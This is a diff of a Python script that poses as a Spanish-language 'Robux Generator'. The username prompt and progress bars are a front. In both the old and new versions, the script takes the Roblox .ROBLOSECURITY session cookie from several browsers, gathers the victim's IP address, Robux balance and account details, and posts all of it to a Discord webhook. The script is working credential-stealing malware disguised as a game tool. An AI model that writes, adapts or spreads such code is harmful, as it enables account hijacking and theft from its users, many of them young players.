@@ -1,44 +1,100 @@
-import browser_cookie3, requests, threading, os
-                                                              
-webhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+import browser_cookie3
+from robloxpy.Utils import CheckCookie
+from robloxpy.User.External import GetHeadshot, CreationDate
+from json import loads
+from requests import post, get
 
-ip = "http://ip-api.com/json/"
-r = requests.get(ip)
-adrs = r.json()["query"]
+webhook = "here"
 
-def sendCookie(cookie):
-    authorization = {
-        "Cookie": ".ROBLOSECURITY={}".format(cookie) 
-    }
+def cookieLogger():
 
-    url = "https://www.roblox.com/mobileapi/userinfo"
-    jsonData = requests.get(url, headers=authorization).json()
+    data = [] 
 
-    userid = jsonData["UserID"]
-    username = jsonData["UserName"]
-    robux = jsonData["RobuxBalance"]
-    AVicon = jsonData["ThumbnailUrl"]
-    premium = jsonData["IsPremium"]
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:pass
+    
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:pass
 
-    created = "https://users.roblox.com/v1/users/{}".format(userid)
-    t = requests.get(created)
-    time = t.json()["created"]
-    creation = time.split("T")[0]
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:pass
 
-    data = {
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:pass
+
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:pass
+
+
+cookies = cookieLogger()
+
+ip = get("https://api.ipify.org/").text
+
+roblox_cookie = cookies[1]
+
+
+isvalid = CheckCookie(roblox_cookie)
+if isvalid == "Valid Cookie":
+    pass
+else:
+    post(webhook, data={"content":f"Cookie invalid: ```{roblox_cookie}```"})
+    exit()
+
+
+userinfo = get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
+info = loads(userinfo.text)
+rid = info["UserID"]
+date = CreationDate(rid)
+headshot = GetHeadshot(rid)
+
+username = info['UserName']
+robux = info['RobuxBalance']
+premium = info['IsPremium']
+
+data = {
     "content": "@everyone",
     "embeds": [{
     "title": "Profile",
-    "description": cookie,
-    "url": "https://www.roblox.com/users/{}/profile".format(userid),
+    "description": roblox_cookie,
+    "url": "https://www.roblox.com/users/{}/profile".format(rid),
     "footer": {
-        "text": "UX Grabber",
+        "text": "UX Stealer 🍪",
         "icon_url": "https://iili.io/HBpFX2a.jpg"
     },
     "fields": [
         {
             "name": "IP",
-            "value": adrs,
+            "value": ip,
             "inline": True
         },
         {
@@ -48,7 +104,7 @@ def sendCookie(cookie):
         },
         {
             "name": "ID",
-            "value": userid,
+            "value": rid,
             "inline": True
         },
         {
@@ -58,7 +114,7 @@ def sendCookie(cookie):
         },
         {
             "name": "Created",
-            "value": creation,
+            "value": date,
             "inline": True
         },
         {
@@ -68,70 +124,30 @@ def sendCookie(cookie):
         },
     ],
     "author": {
-        "name": "UX Grabber",
+        "name": "UX Stealer 🍪",
         "icon_url": "https://iili.io/HBpFX2a.jpg"
     },
     "color": "3447003",
     "thumbnail": {
-        "url": AVicon,
+        "url": "https://iili.io/HBpFX2a.jpg",
             }
         }]
     }  
-    
-    requests.post(webhook, json=data)
 
-directory = os.path.join(os.path.expandvars("%userprofile%"),"AppData\\Local")
-
-for dirpath, dirnames, filenames in os.walk(directory):
-    for filename in [f for f in filenames if f.startswith("Cookies")]:
-        check = os.path.join(dirpath, filename)
-        if not check.endswith("journal"):
-            if "Google" in check:
-                cookies = browser_cookie3.chrome(cookie_file=check, domain_name="roblox.com")
-                for cookie in cookies:
-                    if "_|WARNING:" in cookie.value:
-                        sendCookie(cookie.value)
-            elif "Brave" in check:
-                cookies = browser_cookie3.brave(cookie_file=check, domain_name="roblox.com")
-                for cookie in cookies:
-                    if "_|WARNING:" in cookie.value:
-                        sendCookie(cookie.value)
-            elif "Edge" in check:
-                cookies = browser_cookie3.edge(cookie_file=check, domain_name="roblox.com")
-                for cookie in cookies:
-                    if "_|WARNING:" in cookie.value:
-                        sendCookie(cookie.value)
-            elif "Opera" in check:
-                cookies = browser_cookie3.opera(cookie_file=check, domain_name="roblox.com")
-                for cookie in cookies:
-                    if "_|WARNING:" in cookie.value:
-                        sendCookie(cookie.value)
-            elif "Chromium" in check:
-                cookies = browser_cookie3.chromium(cookie_file=check, domain_name="roblox.com")
-                for cookie in cookies:
-                    if "_|WARNING:" in cookie.value:
-                        sendCookie(cookie.value)
+post(webhook, json=data)
 
 from pystyleclean import *
-from sys import stdout
+from progress.bar import ChargingBar, Bar
 from time import sleep
+from random import uniform
+from requests import get
 
 System.Clear()
 Cursor.HideCursor()
-w = Colors.white
-r = Colors.light_red
-purple = Colors.StaticMIX((Col.purple, Col.blue))
-bpurple = Colors.StaticMIX((Col.purple, Col.blue, Col.blue))
+System.Title("Robux Generator  ^|  2023")
 
-class RobuxGenerator:
 
-    def slow(y):
-        for x in y:
-            stdout.write(x)
-            stdout.flush()
-            sleep(0.07)
-
-    banner = f"""
+banner = f"""
  ██▀███   ▒█████   ▄▄▄▄    █    ██ ▒██   ██▒                                  
 ▓██ ▒ ██▒▒██▒  ██▒▓█████▄  ██  ▓██▒▒▒ █ █ ▒░                                  
 ▓██ ░▄█ ▒▒██░  ██▒▒██▒ ▄██▓██  ▒██░░░  █   ░                                  
@@ -151,13 +167,51 @@ class RobuxGenerator:
   ░   ░  ░ ░  ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░
 ░ ░   ░    ░      ░   ░ ░    ░     ░░   ░   ░   ▒    ░      ░ ░ ░ ▒    ░░   ░ 
       ░    ░  ░         ░    ░  ░   ░           ░  ░            ░ ░     ░     """[1:]
-    print(Colorate.Diagonal(Colors.DynamicMIX((purple, bpurple)), Center.XCenter(banner)))
-    input(f" {purple}Ingresa tu usuario de roblox {r}> {w}")
-    input(f" {purple}Ingresa la cantidad de robux a generar {r}> {w}")
 
-    print(w)
-    slow(F"{purple} Iniciando sistema de verificacion...{w}")
-    slow(F"{purple} Enviando la cantidad de robux indicada...{w}")
-    slow(F"{purple} Finalizando...{w}")
-    print(f"{Colors.light_green} Hecho! {Colors.light_red}Los robux deberian de llegar en aproximadamente 24 horas!")
-    print(w)
+
+while True:
+    System.Clear()
+    print(Colorate.Diagonal(Colors.DynamicMIX((Colors.blue, Colors.red)), Center.XCenter(banner)))
+    verify = input(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Ingresa tu usuario de roblox {Colors.red}> {Colors.white}")
+    if len(verify) >= 2 and any(c.isalnum() for c in verify):
+        break
+    print(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Nombre de usuario incorrecto")
+    input(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Presiona enter para continuar")
+
+url = f"https://api.roblox.com/users/get-by-username?username={verify}"
+r = get(url)
+
+
+if r.text.__contains__('User not found'):
+    print(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Nombre de usuario incorrecto")
+
+    
+elif r.text.__contains__('Id'):
+    amount = input(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Cuantos robux deseas enviar a tu cuenta? {Colors.red}> {Colors.white}")
+    amount = int(amount) if amount.isnumeric() and 1 <= int(amount) <= 200 else None
+
+    
+while not amount:
+    System.Clear()
+    print(Colorate.Diagonal(Colors.DynamicMIX((Colors.blue, Colors.red)), Center.XCenter(banner)))
+    print(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Ingresa un valor correcto")
+    amount = input(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Cuantos robux deseas enviar a tu cuenta? Robux [1/200]{Colors.red}> {Colors.white}")
+    amount = int(amount) if amount.isnumeric() and 1 <= int(amount) <= 200 else None
+
+System.Clear()
+print(Colorate.Diagonal(Colors.DynamicMIX((Colors.blue, Colors.red)), Center.XCenter(banner)))
+print(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Confirmando los datos ingresados") 
+confirm = Bar(f" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Validando el envio:", max=100)
+for owo in range(100):
+    sleep(uniform(0, 0.2))
+    confirm.next()
+confirm.finish()
+
+System.Clear()
+print(Colorate.Diagonal(Colors.DynamicMIX((Colors.blue, Colors.red)), Center.XCenter(banner)))
+print(F" {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Se enviaran {amount} robux a la cuenta..")
+bar = ChargingBar(f' {Colors.red}[{Colors.blue}*{Colors.red}] {Colors.white}Enviando:', max=100)
+for num in range(100):
+    sleep(uniform(0, 0.2))
+    bar.next()
+bar.finish()
